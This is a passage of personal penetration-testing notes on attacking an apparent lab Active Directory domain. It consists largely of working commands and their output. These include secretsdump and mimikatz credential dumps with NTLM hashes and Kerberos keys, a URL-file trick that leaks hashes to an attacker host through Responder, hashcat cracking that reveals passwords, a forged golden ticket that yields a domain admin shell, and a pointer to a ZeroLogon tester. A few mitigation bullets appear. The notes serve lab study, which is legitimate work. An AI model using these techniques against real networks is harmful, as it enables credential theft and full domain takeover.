ATLANTIS.local\jackc:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
ATLANTIS.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
ATLANTIS.local\mikem:1105:aad3b435b51404eeaad3b435b51404ee:7eba549406169e2f2488afc3b444f6ce:::
ATLANTIS.local\Robs:1106:aad3b435b51404eeaad3b435b51404ee:cc242f3d0738600d44e5836271246727:::
evil:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
ZEUS-DC$:1000:aad3b435b51404eeaad3b435b51404ee:424e2403da7b1a74588a73823d885a0e:::
ADONIS$:1107:aad3b435b51404eeaad3b435b51404ee:923500c041807a2d1303c0f93a0875a1:::
BELLE$:1108:aad3b435b51404eeaad3b435b51404ee:7f5b0fce1009faa3d1250892c199844f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4ad5814ac47acdae8caac5c7dc55a8e95b41d22066acc28a70a22f4b97f840bb
Administrator:aes128-cts-hmac-sha1-96:39038e268f843cc9e2de06d6a7703c2d
Administrator:des-cbc-md5:9716cd5e19fdb340
krbtgt:aes256-cts-hmac-sha1-96:eae8749e255d0e80b76827780bbd801959b53ffab017d13dc8a8d2688cf034d8
krbtgt:aes128-cts-hmac-sha1-96:f9c73f6a9de489f7fe9e53b1f4172b0d
krbtgt:des-cbc-md5:5273aba1a17a3494
ATLANTIS.local\jackc:aes256-cts-hmac-sha1-96:2a3815a07e5007a282eb51f6910eeb316a8cc151a425bfbab534e57bcfe8d5f0
ATLANTIS.local\jackc:aes128-cts-hmac-sha1-96:629ab3c6d7f0eaf3b17a9c139ad2a89d
ATLANTIS.local\jackc:des-cbc-md5:3dc15b61e3985419
ATLANTIS.local\SQLService:aes256-cts-hmac-sha1-96:900c77c99577cbd728d2242efc3a4c7f2e8cc345263dd7307d840dc6cebb50e2
ATLANTIS.local\SQLService:aes128-cts-hmac-sha1-96:ecf75deb744976c5e84b90f3407f6bd4
ATLANTIS.local\SQLService:des-cbc-md5:c4675ed94f5b6bcb
ATLANTIS.local\mikem:aes256-cts-hmac-sha1-96:fce9ec504c5d15f29992d5147493ad81eeaf4992f8f166df705c198e58bbac6e
ATLANTIS.local\mikem:aes128-cts-hmac-sha1-96:400ba7da4c6ea81205132262f5bd9479
ATLANTIS.local\mikem:des-cbc-md5:fb0d73d55d943b5d
ATLANTIS.local\Robs:aes256-cts-hmac-sha1-96:b9a03f9e75faed8a141af4a2c0969715f254c04db36ef1099c6ca3fee3adc141
ATLANTIS.local\Robs:aes128-cts-hmac-sha1-96:45c16ca4fd8d538209fd99494c104f05
ATLANTIS.local\Robs:des-cbc-md5:0220265158cda258
evil:aes256-cts-hmac-sha1-96:534099474fe63cef970e0377667054b9dedb9e11c8f309b07d07ea9d8cc5bd19
evil:aes128-cts-hmac-sha1-96:e9248e25d9f00e006f281e4a5d7e8c34
evil:des-cbc-md5:5d7cc22a2a199d70
ZEUS-DC$:aes256-cts-hmac-sha1-96:334d6b69da54fddd459060753f85c9461ec8380686810ea93da0849161323faa
ZEUS-DC$:aes128-cts-hmac-sha1-96:21f33352569770b1a4b04dbf3a356e61
ZEUS-DC$:des-cbc-md5:ce51519d98796164
ADONIS$:aes256-cts-hmac-sha1-96:f0b7b3afceaa29565e6dd464c02d957094457b25ac7d5612311c0ee2a1006ef5
ADONIS$:aes128-cts-hmac-sha1-96:a97c08e43ea20f1c72dc310432935433
ADONIS$:des-cbc-md5:0b0d159432e9a2d3
BELLE$:aes256-cts-hmac-sha1-96:cef814ca1ea4c0cdec5025a19fdd24f21a573bb625f3bc2f1c91a149f617dc0f
BELLE$:aes128-cts-hmac-sha1-96:d909ed04a3267b55818ed55faca152bb
BELLE$:des-cbc-md5:3b0b4c0d263d97df
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
## Mitigations
- Limit user/group token creation permission
- Account tiering
- Local admin restriction


# URL File Attacks
if a compromised user has file shares, can use *responder* to compromise other users

[Active Directory Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

## URL attack
Save a file with following content and name it `"_<somename>.url"` and drop it into a shared folder of the compromised user
- `_` is to make it come to the top of a shared folder
```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\<attacker_ip>\%USERNAME%.icon
IconIndex=1
```

Use Responder:
make sure `responder.conf` has HTTP enabled.
```
responder -I <interface> -v
```
Output:
```
[*] [MDNS] Poisoned answer sent to 192.168.122.57  for name anything.local
[*] [LLMNR]  Poisoned answer sent to 192.168.122.57 for name anything
[HTTP] Sending NTLM authentication request to 192.168.122.57
[*] [MDNS] Poisoned answer sent to 192.168.122.57  for name anything.local
[*] [LLMNR]  Poisoned answer sent to 192.168.122.57 for name anything
[HTTP] GET request from: ::ffff:192.168.122.57  URL: / 
[HTTP] NTLMv2 Client   : 192.168.122.57
[HTTP] NTLMv2 Username : ATLANTIS\jackc
[HTTP] NTLMv2 Hash     : jackc::ATLANTIS:d4e38517e563853b:914FD4E69C34467B2FFF1A7D91DA2B18:0101000000000000219C2C49612ADA01C765DDD83AA698910000000002000800390046005600570001001E00570049004E002D00350046004900440048004A0033005600520057005A000400140039004600560057002E004C004F00430041004C0003003400570049004E002D00350046004900440048004A0033005600520057005A002E0039004600560057002E004C004F00430041004C000500140039004600560057002E004C004F00430041004C000800300030000000000000000100000000200000ED5F9808E7B7D2A897D64AA26FACC177C875F7DEAD449FEAF28823E9913B11990A0010000000000000000000000000000000000009001A0048005400540050002F0061006E0079007400680069006E0067000000000000000000                                                                                                                 
[HTTP] Sending NTLM authentication request to 192.168.122.57
[HTTP] GET request from: ::ffff:192.168.122.57  URL: /favicon.ico 
[HTTP] NTLMv2 Client   : 192.168.122.57
[HTTP] NTLMv2 Username : ATLANTIS\jackc
[HTTP] NTLMv2 Hash     : jackc::ATLANTIS:d4e38517e563853b:11C68723AD42DF36D5B56C5716C25CE5:01010000000000003FD03649612ADA018162544BAA73F2CA0000000002000800390046005600570001001E00570049004E002D00350046004900440048004A0033005600520057005A000400140039004600560057002E004C004F00430041004C0003003400570049004E002D00350046004900440048004A0033005600520057005A002E0039004600560057002E004C004F00430041004C000500140039004600560057002E004C004F00430041004C000800300030000000000000000100000000200000ED5F9808E7B7D2A897D64AA26FACC177C875F7DEAD449FEAF28823E9913B11990A0010000000000000000000000000000000000009001A0048005400540050002F0061006E0079007400680069006E0067000000000000000000
```


## GPP attacks / cPassword attacks
#gpp_attack #cpassword_attack
Previously credentials could be stored in group policies in `groups.xml` which contained passwords as *cpassword*
it's a 10-year old vulnerability. If old files `groups.xml` were not removed after the server was patched for this vulnerability, it can be still relevant.
Kali tools to use
- *gpp-decrypt* #gpp_decrypt
- metasploit `auxiliary(smb_enum_gpp)`
	- all needed is a valid user creds
	- automatically scans 'SYSVOL' folder for groups.xml files and decrypts any cPassword it finds

![[Pasted image 20231209164245.png]]
![[Pasted image 20231209164304.png]]

# mimikatz
#mimikatz 
it is detected by most antiviruses unless heavily obfuscated
- Steal credentials in memory
- generate Kerberos tickets
- pass the hash
- over-pass-the-hash
- Silver ticket
- Golden ticket


## Download
https://github.com/gentilkiwi/mimikatz
Transfer to one of the Windows machines and run `mimikatz.exe`

try the following to get the options:
`privilege::`
Elevate privileges:
`privilege::debug`
Get cached passwords:
`sekurlsa::logonPasswords`

The following was generated on the domain controller machine:
```
PS C:\Users\Administrator\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 230512 (00000000:00038470)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATLANTIS
Logon Server      : ZEUS-DC
Logon Time        : 12/10/2023 12:30:51 PM
SID               : S-1-5-21-3225009144-376844621-2457594147-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ATLANTIS
         * NTLM     : 458c99ef0a3b788a0e082565ec1f471b
         * SHA1     : 3182d38dcdfb0d0a7559bab6f626377772be2ac9
         * DPAPI    : a5a2fdf8023885a901753c8350310dbc
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : ATLANTIS.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 49841 (00000000:0000c2b1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ZEUS-DC$
Domain            : ATLANTIS
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : zeus-dc$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 31923 (00000000:00007cb3)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 31837 (00000000:00007c5d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 29022 (00000000:0000715e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/10/2023 12:29:59 PM
SID               :
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 49810 (00000000:0000c292)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 31858 (00000000:00007c72)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 31778 (00000000:00007c22)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/10/2023 12:30:00 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * NTLM     : 424e2403da7b1a74588a73823d885a0e
         * SHA1     : a592738e2c028b3920132a3ceb41c5476d90b6dc
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS.local
         * Password : f6 c8 ad 92 b9 0a df c3 07 6a c0 6b 28 fc 84 88 11 ab 9f f3 ca a3 45 19 91 c0 64 33 46 7a 2c 08 94 09 e7 9a 28 66 7a 94 2d 6c dd 85 ab 7b 5e ae 4c cc 23 ee 60 f1 94 dc 61 20 aa b1 fb 6d db 59 18 46 e0 0c 88 cd cb 9e 15 dc 55 3c 0f 88 f6 66 d7 92 e7 1f 17 32 c4 55 84 ef 21 c5 ec 94 8d 60 1a 08 2d fc 05 c9 2a 5b 3b 6a 4b bd a7 86 a9 9f a1 6b 39 9e 82 34 39 7d 24 ef 2c c2 f4 09 f4 95 2a 68 46 32 3f e2 91 e2 a5 c3 4a b1 6e 4b c3 b6 dc dc 61 1d c8 33 11 17 f2 d2 02 0f 76 97 32 61 4a 8f e2 7b 0a c7 6c c1 4f 34 cd 78 eb f7 bc a9 9c 08 62 68 42 52 de 5f b1 ef 57 bb 67 29 f7 08 14 b6 55 5c 79 ac 80 78 cb 76 ea 24 14 a7 92 21 ea c0 7e b8 c7 0f 36 2a 3e 25 1f db 44 0f 8f 3d d0 6f 19 e5 d4 64 7e 71 69 38 cc ff 7d 26 cd 60
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ZEUS-DC$
Domain            : ATLANTIS
Logon Server      : (null)
Logon Time        : 12/10/2023 12:29:59 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : ZEUS-DC$
         * Domain   : ATLANTIS
         * Password : (null)
        kerberos :
         * Username : zeus-dc$
         * Domain   : ATLANTIS.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```
# Post-Domain-Compromise
Goals
- `NTDS.dit`
- sensitive data in shares

## NTDS.dit dump
#ntds_dit
Command:
`secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm`
Output:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:458c99ef0a3b788a0e082565ec1f471b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:db56f74ecdfe714d0241e12ef0c62954:::
ATLANTIS.local\jackc:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
ATLANTIS.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
ATLANTIS.local\mikem:1105:aad3b435b51404eeaad3b435b51404ee:7eba549406169e2f2488afc3b444f6ce:::
ATLANTIS.local\Robs:1106:aad3b435b51404eeaad3b435b51404ee:cc242f3d0738600d44e5836271246727:::
evil:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
ZEUS-DC$:1000:aad3b435b51404eeaad3b435b51404ee:424e2403da7b1a74588a73823d885a0e:::
ADONIS$:1107:aad3b435b51404eeaad3b435b51404ee:923500c041807a2d1303c0f93a0875a1:::
BELLE$:1108:aad3b435b51404eeaad3b435b51404ee:7f5b0fce1009faa3d1250892c199844f:::
[*] Cleaning up... 
```

`$ secretsdump.py <domain>/<domain_admin_user>:<password>@<dc_ip> -just-dc-ntlm | rg -e "([^:]*:){6}" |  cut -d ':' -f 4 > ntds.txt`
`$ hashcat -m 1000 ./ntds.txt /usr/share/wordlists/rockyou.mod.txt`
```
1bc3af33d22c1c2baec10a32db22c72d:Password12345!
31d6cfe0d16ae931b73c59d7e0c089c0:
43460d636f269c709b20049cee36ae7a:Password1@
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
```

## Golden Ticket Attacks
#golden_ticket
Goal is to obtain:
- `krbtgt`: password hash
- `domain SID`
We can use mimikatz on the domain controller machine
### Get domain SID and krbtgt NTLM password
Command:
`mimikatz # lsadump::lsa /inject /name:krbtgt`
Output:
```
Domain : ATLANTIS / S-1-5-21-3225009144-376844621-2457594147

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : db56f74ecdfe714d0241e12ef0c62954
    LM   :
  Hash NTLM: db56f74ecdfe714d0241e12ef0c62954
    ntlm- 0: db56f74ecdfe714d0241e12ef0c62954
    lm  - 0: 658c4b1c8f259bd98ea3b6729c4bc3ba

 * WDigest
    01  a889bfe66cd4a2b395111c31a3869ab4
    02  bc393e91e06dd93587f8aa3d7a8436ec
    03  d81a54a7b07b51f1d65e70590a183245
    04  a889bfe66cd4a2b395111c31a3869ab4
    05  bc393e91e06dd93587f8aa3d7a8436ec
    06  40ae0522a2ac940d11a23dd73883ec8a
    07  a889bfe66cd4a2b395111c31a3869ab4
    08  046f5a522225028262fa9697529b5f31
    09  9aec256e565fda65248efe1fabe6f5c2
    10  b88d829ca4629e1f134397a705701bbb
    11  beb59eceffa336997d348cd91462531f
    12  9aec256e565fda65248efe1fabe6f5c2
    13  e6d09cb4d19d2ba326ec562dc8086610
    14  beb59eceffa336997d348cd91462531f
    15  24724b001130ed2aa92b26f3ffcbfa8c
    16  e938769089a961899f5360cf87ef211f
    17  dd08e868f030cc259190203fe1588f2d
    18  a1a09625085258d3619f2000c01dd753
    19  c35a6b742bc28eafe98eadf503868719
    20  58cd37bae21e1fa12ca13ee20a23a94b
    21  3f96aa42a6f217e459108b9ca5b92097
    22  3f96aa42a6f217e459108b9ca5b92097
    23  c3d4e62a7a2bb0f048fa07cffa8ab6a0
    24  5497067445c9bcb2407fbe44445ff872
    25  9e5572d2d893bc590ff0ae3164d3fca0
    26  f925518ed9145a36272086d5a5006975
    27  6331ea404b4c62a5fdc275a706652abd
    28  9de65a3ce32ac294307ee7ce0263c94b
    29  9956fa0779abd59f68759fd53457d551

 * Kerberos
    Default Salt : ATLANTIS.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 5273aba1a17a3494

 * Kerberos-Newer-Keys
    Default Salt : ATLANTIS.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : eae8749e255d0e80b76827780bbd801959b53ffab017d13dc8a8d2688cf034d8
      aes128_hmac       (4096) : f9c73f6a9de489f7fe9e53b1f4172b0d
      des_cbc_md5       (4096) : 5273aba1a17a3494

 * NTLM-Strong-NTOWF
    Random Value : 9011315a6cae7c27f1d71fc2d1bfae39
```

From the output above you need the following
- *domain SID*: which is  `S-1-5-21-3225009144-376844621-2457594147`
- *krbtgt acount's NTLM password*: which is found in Primary/NTLM `db56f74ecdfe714d0241e12ef0c62954`

### Generate Golden Ticket
Command
```
mimikatz # kerberos::golden /USER:<user> /domain:<domain_name> /sid:<domain_sid> /<user:pass> /id:<account_rid> /ptt
                                  ^ can be real of fake
                                                                                              ^ e.g. 500 for admin user
                                                                                                                ^ pass the ticket  
```
example:
```
kerberos::golden /user:administrator /id:500 /domain:atlantis.local /sid: S-1-5-21-3225009144-376844621-2457594147 /krbtgt:db56f74ecdfe714d0241e12ef0c62954 /ptt
```
Output:
```
User      : administrator
Domain    : atlantis.local
ServiceKey: db56f74ecdfe714d0241e12ef0c62954 - rc4_hmac_nt
Lifetime  : 12/10/2023 1:24:54 PM ; 12/7/2033 1:24:54 PM ; 12/7/2033 1:24:54 PM
-> Ticket : ** Pass The Ticket **

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'administrator @ atlantis.local' successfully submitted for current session
```

```
mimikatz # misc::cmd
```
Command above will spawn a command prompt shell which will have access to all resources
```
C:\> whoami
atlantis\administrator
```

- [ ] Failed to access to other machines with admin rights `dir \\adonis\c$` this is expected to work
#todo

# Other AD attacks


## Silver Ticket
#silver_ticket #todo
- [ ] Research about this

## ZeroLogon
#zerologon #danger
> [!danger] Very dangerous! Can destroy the domain!
### test exploitability
https://github.com/SecuraBV/CVE-2020-1472
`python3 zerologon_tester.py <domain_controller_hostname> <dc_ip>` 
e.g.
